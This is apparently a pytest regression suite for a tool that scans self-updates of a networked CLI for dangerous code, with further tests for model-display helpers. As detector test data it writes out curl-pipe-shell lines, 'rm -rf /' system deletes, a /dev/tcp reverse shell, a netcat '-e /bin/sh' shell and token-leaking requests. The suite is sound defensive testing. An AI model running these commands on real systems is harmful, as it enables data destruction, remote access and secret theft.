"""Regression tests for the hivv CLI upgrade-review machinery + display helpers.

Why this suite exists
---------------------
2026-11-14 the review gate wedged the whole network: every bee blocked every
hub CLI update because

  1. the new file's OWN docstrings describing the false positive contained a
     literal download-pipe-shell example → old scanners flagged "critical",
  2. a PRINTED install hint (`opencode | bash`) was treated as executable code,
  3. `line_no` bookkeeping was off by one, and
  4. bytes literals (b"...") were not string-blanked.

Every test here encodes one of those failure modes (or a malicious pattern
that must STAY critical) so they cannot recur silently. The shipped-file
canaries fail the moment someone re-introduces a self-tripping line.

Run:  python3 -m pytest tests/ -q
      (no network, no $HOME writes — state goes to a temp dir)
"""
import importlib.util
import io
import json
import os
import re
import sys
import tempfile
import urllib.error
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
CLI_PATH = REPO / "public_html" / "hivv-cli.py"
SCRIPT_PATH = REPO / "scripts" / "emergency-update.py"

# Isolate ALL state before importing the CLI: the module resolves STATE_DIR at
# import time, so these must be set first. HUB points at a dead port so any
# accidental request fails fast instead of touching production.
os.environ["HIVV_STATE_DIR"] = tempfile.mkdtemp(prefix="hivv-test-state-")
os.environ["HIVV_HUB"] = "http://127.0.0.1:1"

_spec = importlib.util.spec_from_file_location("hivv_cli", str(CLI_PATH))
hivv = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(hivv)

# The exact download-into-shell pattern old bees use (kept in sync on purpose:
# if this regex ever changes, so must the shipped-file canaries).
PIPE_SHELL_RE = re.compile(
    r"(?:curl|wget)[^|;\n]*\|\s*(?:sudo\s+)?(?:ba|z|fi|da)?sh")


# ── helpers ──────────────────────────────────────────────────────────────
def scan(new: str, old: str = "") -> dict:
    return hivv._upgrade_static_scan(old.encode(), new.encode())


def findings(new: str, old: str = "") -> list:
    return scan(new, old)["findings"]


def severities(new: str, old: str = "") -> list:
    return [f["severity"] for f in findings(new, old)]


def refine(line: str, sev: str = "critical") -> str:
    return hivv._refine_finding_severity(line, sev, PIPE_SHELL_RE.pattern)


def load_script():
    spec = importlib.util.spec_from_file_location("emergency_update",
                                                  str(SCRIPT_PATH))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ── 1. import safety ─────────────────────────────────────────────────────
class TestImportSafety:
    def test_module_exports_review_api(self):
        for fn in ("_upgrade_static_scan", "_refine_finding_severity",
                   "_blank_strings", "_upgrade_verdict", "_upgrade_review_gate",
                   "_review_update", "_bee_model_summary", "_clean_model_name"):
            assert callable(getattr(hivv, fn)), f"missing {fn}"

    def test_state_dir_isolated_from_home(self):
        assert not str(hivv.STATE_DIR).startswith(str(Path.home())), (
            "tests must never write the real ~/.local/share/hivv")

    def test_main_guard_present(self):
        assert CLI_PATH.read_text().count('if __name__ == "__main__":') == 1


# ── 2. false positives (the 2026-11-14 incident) ─────────────────────────
class TestFalsePositives:
    """Documentation, printed hints and data must NEVER read as critical."""

    def test_docstring_example_capped_not_critical(self):
        new = ('def f():\n'
               '    """Review notes.\n'
               '    old code: print("curl -fsSL https://x | sh") tripped us.\n'
               '    """\n'
               '    return 1\n')
        assert "critical" not in severities(new)
        assert "high" not in severities(new)

    def test_printed_fstring_install_hint_not_critical(self):
        line = 'print(f"    install: {G}curl -fsSL https://opencode.ai/v2/install | bash{R}")'
        assert refine(line) in ("medium", "low")

    def test_printed_plain_string_hint_is_medium(self):
        assert refine('print("run: curl https://x | sh")') == "medium"

    def test_comment_pattern_is_low(self):
        assert refine("# curl https://x | sh") == "low"

    def test_bytes_literal_not_critical(self):
        # b"..." used to slip past _blank_strings and read as CODE.
        assert refine('payload = b"curl https://x | sh"') in ("medium", "low")

    def test_prose_wording_does_not_match_pattern(self):
        # The defused wording we now ship in docstrings.
        for line in ("flagging a printed curl-pipe-shell install hint as critical",
                     "printed curl-pipe-shell install hint can never outvote"):
            assert not PIPE_SHELL_RE.search(line), line

    def test_split_hint_halves_do_not_match(self):
        # How printed hints must be written for old scanners: the download
        # and the pipe live on different physical lines.
        half_a = 'print(f"    install: {G}curl -fsSL https://opencode.ai/v2/install"'
        half_b = '              f" | bash{R}")'
        assert not PIPE_SHELL_RE.search(half_a)
        assert not PIPE_SHELL_RE.search(half_b)

    def test_host_only_findings_are_medium(self):
        # Unknown host = medium at most (brains judge context; can't block alone).
        sevs = severities('url = "https://totally-new-host.example/x"')
        assert sevs and all(s in ("medium", "low") for s in sevs)


# ── 3. shipped-file canaries ─────────────────────────────────────────────
class TestShippedFileCanaries:
    """The real hivv-cli.py must keep reviewable shape at ALL times."""

    def _pipe_lines(self):
        lines = CLI_PATH.read_text(encoding="utf-8").splitlines()
        return [(i + 1, l) for i, l in enumerate(lines) if PIPE_SHELL_RE.search(l)]

    def test_pipe_lines_exist_and_are_only_known_shapes(self):
        hits = self._pipe_lines()
        assert hits, "expected some install-hint prints in the CLI"
        for lineno, line in hits:
            allowed = ("install.sh" in line or "install-hivv.sh" in line
                       or '"sh", "-c"' in line)
            assert allowed, (
                f"line {lineno} contains the download-pipe-shell pattern but is "
                f"not an install hint or the known argv exec:\n  {line}")

    def test_pipe_lines_refine_noncritical_unless_argv_exec(self):
        for lineno, line in self._pipe_lines():
            sev = refine(line, "critical")
            if '"sh", "-c"' in line:
                assert sev == "critical", (
                    f"line {lineno}: real shell exec must stay critical")
            else:
                assert sev in ("medium", "low"), (
                    f"line {lineno}: printed hint capped, got {sev}: {line}")

    def test_no_bare_selftrip_literal(self):
        # The exact prose that re-tripped old scanners on 2026-11-14.
        text = CLI_PATH.read_text(encoding="utf-8")
        assert '`print("curl … | sh")`' not in text
        assert 'print("curl … | sh")' not in text

    def test_host_allowlist_covers_shipped_hosts(self):
        for host in ("hivv.org", "opencode.ai", "tailscale.com", "ollama.com"):
            assert host in hivv._UPGRADE_HOST_ALLOW, host

    def test_full_scan_from_empty_has_no_critical_above_truncation(self):
        # Smoke canary: with an empty base every line counts as added. The
        # scanner bounds pathological diffs (6000 lines) — whatever it does
        # return must not be critical-from-documentation.
        r = hivv._upgrade_static_scan(b"", CLI_PATH.read_bytes())
        assert r["added"] > 6000 and r["truncated"] is True
        for f in r["findings"]:
            assert f["severity"] in ("medium", "low"), f


# ── 4. true positives (must stay blocking) ───────────────────────────────
class TestTruePositives:
    """Malicious/ dangerous shapes must keep their critical/high severity —
    otherwise defusing false positives would blind the scanner."""

    def test_sh_dash_c_argv_stays_critical(self):
        assert refine('cmd = ["sh", "-c", "curl http://x/y | sh"]') == "critical"

    def test_subprocess_shell_true_stays_critical(self):
        assert refine('subprocess.run("wget -qO- http://x | sh", shell=True)') == "critical"

    def test_os_system_stays_critical(self):
        assert refine('os.system("curl http://x | sh")') == "critical"

    @pytest.mark.parametrize("code", [
        "os.system('rm -rf /usr')",
        "subprocess.run('rm -rf /', shell=True)",
        "subprocess.call('rm -rf /var/lib/x', shell=True)",
    ])
    def test_recursive_system_delete_flagged_critical(self, code):
        fs = findings(f"import os\n{code}\n")
        assert any(f["severity"] == "critical" for f in fs), fs

    def test_rm_pattern_scoped_to_system_paths(self):
        rm = re.compile(r"\brm\s+-[a-z]*r[a-z]*f?\s+/(?:\s|$|['\"\)]|etc|usr|home|var|boot)")
        assert rm.search("rm -rf /usr")
        assert rm.search("rm -rf /")
        assert not rm.search("rm -rf ./build")

    def test_bash_reverse_shell_flagged_critical(self):
        fs = findings("exec 3<>/dev/tcp/10.0.0.1/4444\n")
        assert any(f["severity"] == "critical" and "reverse-shell" in f["why"]
                   for f in fs), fs

    def test_netcat_exec_flagged_critical(self):
        fs = findings("nc -e /bin/sh 10.0.0.1 4444\n")
        assert any(f["severity"] == "critical" and "netcat" in f["why"]
                   for f in fs), fs
        # plain port scan must not trip it
        assert not any("netcat" in f["why"] for f in findings("nc -z host 22\n"))

    def test_raw_socket_connect_bare_ip_flagged_critical(self):
        # `socket.socket(...).connect(("1.2.3.4", …))` — the parens-crossing
        # shape the old [^)\n]* pattern could never match.
        fs = findings('sock = socket.socket().connect(("10.9.8.7", 4444))\n')
        assert any(f["severity"] == "critical" and "bare IP" in f["why"]
                   for f in fs), fs

    def test_socket_connect_to_hostname_not_flagged(self):
        fs = findings('sock = socket.socket().connect(("example.com", 4444))\n')
        assert not any("bare IP" in f["why"] for f in fs)

    def test_secret_exfiltration_stays_critical(self):
        line = ('req = urllib.request.Request(u, headers={"a": HIVV_CONTROL_TOKEN})'
                '; urllib.request.urlopen(req)\n')
        fs = findings(line)
        assert any(f["severity"] == "critical" and "secret" in f["why"]
                   for f in fs), fs

    def test_eval_stays_high(self):
        fs = findings("eval(user_input)\n")
        assert any(f["severity"] == "high" and "dynamic code" in f["why"]
                   for f in fs), fs

    def test_pickle_deser_stays_high(self):
        fs = findings("data = pickle.loads(raw)\n")
        assert any(f["severity"] == "high" and "deserializes" in f["why"]
                   for f in fs), fs

    def test_persistence_via_cron_stays_high_with_exec_consumer(self):
        fs = findings("import os\nos.system('crontab -r')\n")
        assert any(f["severity"] == "high" and "persists" in f["why"]
                   for f in fs), fs

    def test_ssh_key_touch_is_at_least_medium(self):
        fs = findings('path = "~/.ssh/id_rsa"\n')
        ssh = [f for f in fs if "SSH" in f["why"]]
        assert ssh and all(f["severity"] in ("medium", "high", "critical")
                           for f in ssh)


# ── 5. _blank_strings / _refine_finding_severity units ───────────────────
class TestBlankStrings:
    def test_fstring_blanked(self):
        assert "curl" not in hivv._blank_strings('x = f"curl a | sh"')

    def test_raw_string_blanked(self):
        assert "curl" not in hivv._blank_strings('x = r"curl a | sh"')

    def test_bytes_and_combo_prefixes_blanked(self):
        for lit in ('b"curl a | sh"', 'br"curl a | sh"', 'rb"curl a | sh"',
                    'fr"curl a | sh"', 'rf"curl a | sh"'):
            assert "curl" not in hivv._blank_strings(f"x = {lit}"), lit

    def test_single_line_triple_blanked(self):
        assert "curl" not in hivv._blank_strings('x = """curl a | sh"""')

    def test_comment_stripped(self):
        assert "curl" not in hivv._blank_strings("code = 1  # curl a | sh")

    def test_escaped_quote_does_not_leak(self):
        out = hivv._blank_strings(r'x = "say \"curl a | sh"')
        assert "curl" not in out

    def test_code_outside_strings_survives(self):
        assert "wget_count" in hivv._blank_strings("total = wget_count + 1")


class TestRefineMatrix:
    def test_comment_low(self):
        assert refine("# wget a | sh") == "low"

    def test_string_only_medium(self):
        assert refine('msg = "wget a | sh"') == "medium"

    def test_code_pattern_keeps_original(self):
        # matches the pipe pattern in REAL code (no strings involved)
        assert refine("total = wget_ok | shutil_dir", "critical") == "critical"

    def test_exec_consumer_keeps_original(self):
        assert refine('p = subprocess.run("wget a | sh")', "critical") == "critical"

    def test_argv_form_checked_raw(self):
        assert refine('args = ["zsh", "-c", "wget a | sh"]', "critical") == "critical"


# ── 6. host allowlist ────────────────────────────────────────────────────
class TestHostAllowlist:
    def _host_findings(self, new):
        return [f for f in findings(new) if "outbound host" in f["why"]]

    def test_known_hosts_allowed(self):
        for url in ("https://hivv.org/api", "https://sub.hivv.org/x",
                    "https://raw.githubusercontent.com/o/r/f",
                    "https://opencode.ai/install",
                    "http://127.0.0.1:8080/v1"):
            assert self._host_findings(f'u = "{url}"') == [], url

    def test_unknown_host_flagged_medium(self):
        fs = self._host_findings('u = "https://new-vendor.example/api"')
        assert len(fs) == 1 and fs[0]["severity"] == "medium"
        assert "new-vendor.example" in fs[0]["why"]

    def test_lookalike_domain_flagged(self):
        # hivv.org.evil.example is NOT ours
        fs = self._host_findings('u = "https://hivv.org.evil.example/x"')
        assert len(fs) == 1

    def test_subdomain_of_allowed_host_allowed(self):
        assert self._host_findings('u = "https://api.hivv.org/v1"') == []

    def test_schemeless_ip_not_a_host_finding(self):
        assert self._host_findings("host = 192.168.1.50") == []

    def test_schemed_ip_flagged(self):
        fs = self._host_findings('u = "http://192.168.1.50:8080/v1"')
        assert len(fs) == 1 and fs[0]["severity"] == "medium"


# ── 7. diff semantics ────────────────────────────────────────────────────
class TestDiffSemantics:
    def test_only_added_lines_scanned(self):
        old = 'bad = "curl http://x | sh"\n'
        r = scan("good = 1\n", old=old)
        assert not r["findings"] and r["removed"] == 1

    def test_unchanged_dangerous_line_not_rescanned(self):
        line = 'x = 1\nbad = "curl http://x | sh"\n'
        r = scan(line, old=line)
        assert not r["findings"] and r["added"] == 0 == r["removed"]

    def test_added_line_numbering_exact(self):
        old = "line1\nline2\nline3\n"
        new = old + 'cmd = ["sh", "-c", "curl http://x/y | sh"]\nline5\n'
        fs = scan(new, old=old)["findings"]
        assert fs, "expected findings for the added exec line"
        assert all(f["line_no"] == 4 for f in fs), fs  # 4th line of new file

    def test_top_insert_numbering_exact(self):
        old = "line1\nline2\n"
        new = 'bad = "curl http://x | sh"\n' + old
        fs = [f for f in scan(new, old=old)["findings"]
              if "pipes a download" in f["why"]]
        assert fs and all(f["line_no"] == 1 for f in fs), fs

    def test_counts(self):
        old = "a\nb\nc\n"
        new = "a\nB\nc\nd\ne\n"
        r = scan(new, old=old)
        assert (r["added"], r["removed"]) == (3, 1)

    def test_truncation_bounds_mega_diffs(self):
        new = "\n".join(f"x = {i}" for i in range(6100)) + "\n"
        r = scan(new)
        assert r["truncated"] is True and r["added"] == 6100

    def test_pattern_and_host_can_both_report_one_line(self):
        line = 'u = "https://new-host.example" + " curl http://x | sh"'
        fs = findings(line)
        assert any("pipes a download" in f["why"] for f in fs)
        assert any("outbound host" in f["why"] for f in fs)


# ── 8. verdict combination ───────────────────────────────────────────────
class TestVerdict:
    CRIT = {"findings": [{"severity": "critical", "why": "pipes a download straight into a shell"}]}
    MED = {"findings": [{"severity": "medium", "why": "new outbound host not in allowlist: x"}]}
    HIGH = {"findings": [{"severity": "high", "why": "touches SSH keys"}]}
    CLEAN = {"findings": []}
    V_OK = [{"verdict": "ok", "brain": "a"}]
    V_SUS = [{"verdict": "suspicious", "brain": "b"}]

    def test_critical_always_suspicious_even_with_ok_votes(self):
        v, why = hivv._upgrade_verdict(self.CRIT, self.V_OK * 3)
        assert v == "suspicious" and "critical pattern" in why

    def test_medium_never_blocks_alone(self):
        v, _ = hivv._upgrade_verdict(self.MED, [])
        assert v == "ok"

    def test_majority_suspicious_blocks(self):
        v, why = hivv._upgrade_verdict(self.CLEAN, self.V_SUS * 2 + self.V_OK)
        assert v == "suspicious" and "flagged it" in why

    def test_tie_goes_ok_confirmation_round_will_break_it(self):
        v, _ = hivv._upgrade_verdict(self.CLEAN, self.V_SUS + self.V_OK)
        assert v == "ok"

    def test_minority_suspicion_ok(self):
        v, _ = hivv._upgrade_verdict(self.CLEAN, self.V_OK * 2 + self.V_SUS)
        assert v == "ok"

    def test_no_brains_high_blocks(self):
        v, why = hivv._upgrade_verdict(self.HIGH, [])
        assert v == "suspicious" and "static high" in why

    def test_no_brains_clean_passes(self):
        v, why = hivv._upgrade_verdict(self.CLEAN, [])
        assert v == "ok" and "static scan clean" in why

    def test_no_brains_medium_only_passes(self):
        v, _ = hivv._upgrade_verdict(self.MED, [])
        assert v == "ok"


# ── 9. review gate (network mocked out) ──────────────────────────────────
class TestGate:
    @pytest.fixture(autouse=True)
    def isolated(self, monkeypatch, tmp_path):
        # fresh state per test, review + hub report stubbed
        box = {}
        monkeypatch.setattr(hivv, "read_state", lambda: dict(box))
        monkeypatch.setattr(hivv, "write_state",
                            lambda s: box.clear() or box.update(s))
        self.reported = []
        monkeypatch.setattr(
            hivv, "_upgrade_report_once",
            lambda payload, sha, action, timeout=6.0: (
                self.reported.append((action, payload, sha)) or True))
        self.reviews = 0
        return box

    def _review_result(self, verdict, reason="r"):
        def fake(old, new, *, source="manual", echo=None, budget_s=60):
            self.reviews += 1
            return {"verdict": verdict, "reason": reason,
                    "scan": {"findings": [], "added": 0, "removed": 0,
                             "truncated": False},
                    "votes": [], "source": source}
        return fake

    def _gate(self, monkeypatch, verdict="ok", **kw):
        monkeypatch.setattr(hivv, "_review_update",
                            self._review_result(verdict, kw.pop("reason", "r")))
        return hivv._upgrade_review_gate(b"unique-bytes-" + verdict.encode(),
                                         source="manual", **kw)

    def test_ok_gate_allows(self, monkeypatch):
        g = self._gate(monkeypatch, "ok")
        assert g["allow"] is True and g["verdict"] == "ok"

    def test_suspicious_blocks_and_reports_once(self, monkeypatch):
        g = self._gate(monkeypatch, "suspicious", reason="bad stuff")
        assert g["allow"] is False and g["verdict"] == "suspicious"
        assert "bad stuff" in g["reason"]
        assert self.reported and self.reported[0][0] == "blocked"

    def test_force_allows_suspicious_but_keeps_verdict(self, monkeypatch):
        g = self._gate(monkeypatch, "suspicious", force=True)
        assert g["allow"] is True and g["verdict"] == "suspicious"
        # gate itself must not report "blocked" on a forced apply
        assert not self.reported

    def test_second_call_hits_verdict_cache(self, monkeypatch):
        monkeypatch.setattr(hivv, "_review_update",
                            self._review_result("ok"))
        payload = b"cache-bytes-v1"
        echoes = []
        hivv._upgrade_review_gate(payload, source="auto", echo=echoes.append)
        assert self.reviews == 1
        hivv._upgrade_review_gate(payload, source="auto", echo=echoes.append)
        assert self.reviews == 1, "cached sha must not be re-reviewed"
        assert any("cached" in e for e in echoes)

    def test_cached_suspicious_still_blocks_without_force(self, monkeypatch):
        monkeypatch.setattr(hivv, "_review_update",
                            self._review_result("suspicious", reason="cache says no"))
        payload = b"cache-bytes-sus"
        hivv._upgrade_review_gate(payload, source="auto")
        g = hivv._upgrade_review_gate(payload, source="auto")
        assert g["allow"] is False and self.reviews == 1

    def test_review_error_never_wedges_update(self, monkeypatch):
        # The guarantee lives inside _review_update: ANY machinery exception
        # degrades to "ok + review error (continuing)" instead of blocking —
        # sha256 + healthcheck still guard the apply.
        def boom(*a, **k):
            raise RuntimeError("brains exploded")
        monkeypatch.setattr(hivv, "_upgrade_static_scan", boom)
        r = hivv._review_update(b"old", b"new", source="auto")
        assert r["verdict"] == "ok"
        assert "review error" in r["reason"]

    def test_review_error_result_passes_gate(self, monkeypatch):
        # gate consumes the degraded result shape and still allows.
        def fake(old, new, *, source="manual", echo=None, budget_s=60):
            self.reviews += 1
            return {"verdict": "ok", "reason": "review error (continuing): x",
                    "scan": {"findings": [], "added": 0, "removed": 0},
                    "votes": [], "source": source}
        monkeypatch.setattr(hivv, "_review_update", fake)
        g = hivv._upgrade_review_gate(b"error-bytes", source="auto")
        assert g["allow"] is True
        assert "review error" in g["reason"]

    def test_gate_returns_full_structure(self, monkeypatch):
        g = self._gate(monkeypatch, "ok")
        assert set(g) >= {"allow", "verdict", "reason", "review"}
        assert "scan" in g["review"] and "votes" in g["review"]


# ── 10. emergency network update script ──────────────────────────────────
class TestEmergencyScript:
    def test_targets_online_only(self):
        mod = load_script()
        nodes = [{"name": "a", "status": "online"},
                 {"name": "b", "status": "stale"},
                 {"name": "c", "status": "offline"},
                 {"name": "d", "status": "online"}]
        assert mod._targets(nodes) == ["a", "d"]

    def test_targets_node_filter(self):
        mod = load_script()
        nodes = [{"name": "a", "status": "online"},
                 {"name": "b", "status": "online"}]
        assert mod._targets(nodes, ["b"]) == ["b"]
        assert mod._targets(nodes, ["zzz"]) == []

    def test_targets_name_falls_back_to_id(self):
        mod = load_script()
        nodes = [{"id": "n-1", "status": "online"}]
        assert mod._targets(nodes) == ["n-1"]

    def test_targets_tolerates_junk(self):
        mod = load_script()
        assert mod._targets(None) == []
        assert mod._targets([None, 42, {}, {"status": "online"}]) == []

    def test_script_has_main_guard(self):
        assert 'if __name__ == "__main__":' in SCRIPT_PATH.read_text()


# ── 11. repair-plan allowlists (the emergency lever's guardrails) ────────
class TestRepairAllowlist:
    def test_repair_ops_is_exact_allowlist(self):
        # A hole here = arbitrary code via "signed" plans.
        assert hivv.REPAIR_OPS == {"cli_update", "agent_restart",
                                   "reap_duplicates", "service_restart"}

    def test_repair_units_is_finite_allowlist(self):
        units = getattr(hivv, "REPAIR_UNITS", None)
        assert units is not None and len(units) <= 20
        assert "llama.service" in units

    def test_only_cli_update_takes_force(self):
        # cmd_repair refuses --force on anything but cli_update — pin the rule.
        src = CLI_PATH.read_text()
        assert '--force only applies to --op cli_update' in src


# ── 12. display helpers: models by bee ───────────────────────────────────
class TestBeeModelSummary:
    NODES = [
        {"name": "yalla", "status": "online",
         "local_models": [{"provider": "llama.cpp:8080", "model": "gemma-4-2b"},
                          {"provider": "ollama", "model": "qwen2.5:0.5b"}]},
        {"name": "masjid", "status": "offline",
         "local_models": [{"provider": "llama.cpp:8081", "model": "gemma-E2B"}]},
        {"name": "empty", "status": "online", "local_models": []},
    ]

    def test_models_rendered_per_bee(self):
        lines = hivv._bee_model_summary(self.NODES)
        assert len(lines) == 3  # yalla + masjid + explicit empty line
        assert "yalla" in lines[0] and "gemma-4-2b" in lines[0]
        assert "qwen2.5:0.5b" in lines[0] and "llama.cpp:8080" in lines[0]

    def test_online_empty_gets_explicit_none_line(self):
        # the 2026-11-14 "why only one bee?" question: empties must be VISIBLE
        lines = hivv._bee_model_summary(self.NODES)
        assert any("empty" in l and "(no local models reported)" in l
                   for l in lines), lines

    def test_offline_empty_stays_hidden(self):
        nodes = self.NODES + [{"name": "ghost", "status": "offline",
                               "local_models": []}]
        lines = hivv._bee_model_summary(nodes)
        assert not any("ghost" in l for l in lines)

    def test_offline_marked(self):
        lines = hivv._bee_model_summary(self.NODES)
        assert "[offline]" in lines[1]

    def test_online_unmarked(self):
        lines = hivv._bee_model_summary(self.NODES)
        assert "[offline]" not in lines[0]

    def test_junk_input_safe(self):
        assert hivv._bee_model_summary(None) == []
        assert hivv._bee_model_summary([None, 7, {}]) == []

    def test_missing_fields_render_question_marks(self):
        lines = hivv._bee_model_summary(
            [{"local_models": [{}], "status": "online"}])
        assert len(lines) == 1 and "?" in lines[0]

    def test_long_line_truncated(self):
        nodes = [{"name": "n", "status": "online",
                  "local_models": [{"model": "x" * 300, "provider": "llama.cpp"}]}]
        line = hivv._bee_model_summary(nodes, width=60)[0]
        assert len(line) <= 60 and line.endswith("…")

    def test_name_falls_back_to_id(self):
        lines = hivv._bee_model_summary(
            [{"id": "node-9", "status": "online", "local_models": [{"model": "m"}]}])
        assert "node-9" in lines[0]


# ── 13. model-name cleanup (feeds the by-bee display + heartbeats) ───────
class TestCleanModelName:
    def test_hf_cache_path(self):
        raw = ("/home/u/.cache/huggingface/hub/models--unsloth--gemma-4/blobs/"
                + "a" * 64)
        assert hivv._clean_model_name(raw) == "unsloth/gemma-4"

    def test_sha256_short_id(self):
        assert hivv._clean_model_name("b" * 64) == "model:bbbbbbbb"

    def test_clean_passthrough(self):
        assert hivv._clean_model_name("llama3.1:8b") == "llama3.1:8b"

    def test_empty_is_unknown(self):
        assert hivv._clean_model_name("") == "unknown"
        assert hivv._clean_model_name("unknown") == "unknown"

    def test_path_takes_last_segment(self):
        assert hivv._clean_model_name("/opt/models/my-model.gguf") == "my-model.gguf"

    def test_hf_path_with_different_org(self):
        raw = "models--Qwen--Qwen2.5-0.5B-Instruct-GGUF/blobs/" + "c" * 64
        assert hivv._clean_model_name(raw) == "Qwen/Qwen2.5-0.5B-Instruct-GGUF"


# ── 14. local-LLM detection (heartbeat truth: 8090 + keyed servers) ──────
class _FakeHTTPResponse:
    def __init__(self, body: bytes):
        self._body = body

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _fake_urlopen(responses: dict):
    """urlopen double: {url-substring: bytes | Exception}; unmatched ports
    behave like a closed port (connection refused)."""
    def fake(req, *args, **kwargs):
        url = getattr(req, "full_url", str(req))
        for key, val in responses.items():
            if key in url:
                if isinstance(val, BaseException):
                    raise val
                return _FakeHTTPResponse(val)
        raise ConnectionRefusedError("closed port")
    return fake


def _http_error(url: str, code: int, body: bytes) -> urllib.error.HTTPError:
    return urllib.error.HTTPError(url, code, "err", None, io.BytesIO(body))


class TestDetectLocalAi:
    def _detect(self, monkeypatch, responses):
        monkeypatch.setattr("urllib.request.urlopen", _fake_urlopen(responses))
        return hivv._detect_local_ai()

    def test_llama_on_8090_detected(self, monkeypatch):
        # ashy's case: llama runs on 8090 (8080 owned by Next.js)
        body = json.dumps({"data": [
            {"id": "models--org--cool/blobs/" + "a" * 64}]}).encode()
        res = self._detect(monkeypatch, {":8090/v1/models": body})
        hit = [m for m in res if m.get("port") == 8090]
        assert hit and hit[0]["provider"] == "llama.cpp:8090"
        assert hit[0]["model"] == "org/cool"
        assert not hit[0].get("locked")

    def test_keyed_llama_reported_locked(self, monkeypatch):
        # yalla's case: llama --api-key answers 401 — must NOT vanish
        err = _http_error(
            "http://localhost:8080/v1/models", 401,
            b'{"error":{"message":"Invalid API Key","type":"authentication_error","code":401}}')
        res = self._detect(monkeypatch, {":8080/v1/models": err})
        hit = [m for m in res if m.get("port") == 8080]
        assert hit, res
        assert hit[0]["locked"] is True
        assert "api-key" in hit[0]["model"]
        assert hit[0]["provider"] == "llama.cpp:8080"

    def test_webapp_401_not_misread_as_llama(self, monkeypatch):
        # FastAPI-style 401 on a non-LLM app must not become a fake llama
        err = _http_error("http://localhost:8081/v1/models", 401,
                          b'{"detail":"Not authenticated"}')
        res = self._detect(monkeypatch, {":8081/v1/models": err})
        assert [m for m in res if m.get("port") == 8081] == []

    def test_webapp_html_skipped(self, monkeypatch):
        # ashy's 8080 Next.js page — garbage-in, empty-out
        res = self._detect(monkeypatch, {
            ":8080/v1/models": b"<!DOCTYPE html><html><body>hi</body></html>"})
        assert [m for m in res if m.get("port") == 8080] == []

    def test_lm_studio_port_labeled(self, monkeypatch):
        body = json.dumps({"data": [{"id": "some-model"}]}).encode()
        res = self._detect(monkeypatch, {":1234/v1/models": body})
        hit = [m for m in res if m.get("port") == 1234]
        assert hit and hit[0]["provider"] == "lm-studio:1234"

    def test_ollama_detected(self, monkeypatch):
        tags = json.dumps({"models": [{"name": "qwen2.5:0.5b", "size": 123}]}).encode()
        res = self._detect(monkeypatch, {":11434/api/tags": tags})
        hit = [m for m in res if m.get("provider") == "ollama"]
        assert hit and hit[0]["model"] == "qwen2.5:0.5b" and hit[0]["loaded"] is True

    def test_closed_ports_stay_silent(self, monkeypatch):
        assert self._detect(monkeypatch, {}) == []

    def test_locked_entries_excluded_from_brain_urls(self, monkeypatch):
        # a keyed server would only 401 the review brain — skip it
        monkeypatch.setattr(hivv, "_detect_local_ai", lambda: [
            {"provider": "llama.cpp:8080", "model": "locked (api-key required)",
             "locked": True, "port": 8080},
            {"provider": "llama.cpp:8090", "model": "real-model",
             "loaded": True, "port": 8090},
        ])
        monkeypatch.setattr("urllib.request.urlopen", _fake_urlopen({}))
        urls = hivv._local_brain_urls()
        labels = [lbl for lbl, _ in urls]
        assert not any("locked" in l for l in labels)
        assert any("8090" in l for l in labels)


# ── 15. review prompt sanity (brains get context) ────────────────────────
class TestReviewPrompt:
    def test_prompt_flags_expected_benign(self):
        p = hivv._REVIEW_PROMPT
        assert "{diff}" in p
        assert "SELF-UPDATING" in p
        assert "VERDICT: SUSPICIOUS" in p

    def test_confirm_prompt_demands_evidence(self):
        c = hivv._REVIEW_CONFIRM
        assert "{objection}" in c and "{diff}" in c
        assert "CONCRETE" in c

    def test_patterns_table_shape(self):
        assert hivv._UPGRADE_RISK_PATTERNS
        for pat, sev, why in hivv._UPGRADE_RISK_PATTERNS:
            assert sev in ("critical", "high", "medium")
            assert why and isinstance(why, str)
            re.compile(pat)  # must be valid regex


# ── 16. confirmation-round wiring (tie-breaker, evidence demand) ──────────
class TestConfirmationRound:
    """End-to-end _review_update confirmation behaviour: vote-only suspicion
    (clean static scan) must ALWAYS face the adversarial re-ask — majority,
    unanimous, or TIE — and only concrete evidence stands."""

    @staticmethod
    def _vote(verdict, brain, via, reason="initial vibe"):
        return {"verdict": verdict, "brain": brain, "via": via,
                "reason": reason, "ms": 5}

    def _run(self, monkeypatch, local_votes, hive_votes, confirm_verdict,
             static_findings=None, track_http=None):
        import hmac as _hmac  # noqa: F401  (keep linters quiet about local imports)
        state = {"asks": []}
        monkeypatch.setattr(
            hivv, "_upgrade_static_scan",
            lambda o, n: {"findings": static_findings or [], "added": 1,
                          "removed": 0, "truncated": False})
        monkeypatch.setattr(hivv, "_review_local_brains",
                            lambda *a, **k: list(local_votes))
        monkeypatch.setattr(hivv, "_review_hive_brains",
                            lambda *a, **k: list(hive_votes))

        def fake_ask(url, prompt, timeout=30.0):
            state["asks"].append(prompt)
            return {"verdict": confirm_verdict, "reason": "re-evaluated on demand",
                    "ms": 3}
        monkeypatch.setattr(hivv, "_ask_review_brain", fake_ask)
        monkeypatch.setattr(hivv, "_local_brain_urls",
                            lambda *a, **k: [("local:port:8090",
                                              "http://127.0.0.1:9/v1/chat/completions")])
        if track_http is not None:
            def fake_http(method, path, **kw):
                track_http.append((method, path))
                return (200, {"nodes": [{"name": "yalla", "lan_ip": "192.168.1.209",
                                         "local_models": [{"port": 8080, "name": "qwen"}]}]})
            monkeypatch.setattr(hivv, "http", fake_http)
        res = hivv._review_update(b"x = 1\n", b"x = 2\n",
                                  source="manual", budget_s=5)
        return res, state["asks"]

    def test_tie_flagger_holds_flips_to_blocked(self, monkeypatch):
        # local flags, hive approves → tie; flagger cannot cite evidence → BLOCK.
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("ok", "bee:yalla/qwen", "hive")],
            confirm_verdict="suspicious")
        assert res["verdict"] == "suspicious"
        assert "tie broken" in res["reason"]
        assert len(asks) == 1 and "CONCRETE" in asks[0]
        confirms = [v for v in res["votes"] if v.get("via") == "confirm"]
        assert confirms and confirms[0]["verdict"] == "suspicious"

    def test_tie_flagger_retracts_passes(self, monkeypatch):
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("ok", "bee:yalla/qwen", "hive")],
            confirm_verdict="ok")
        assert res["verdict"] == "ok"
        assert "not confirmed" in res["reason"]
        assert len(asks) == 1

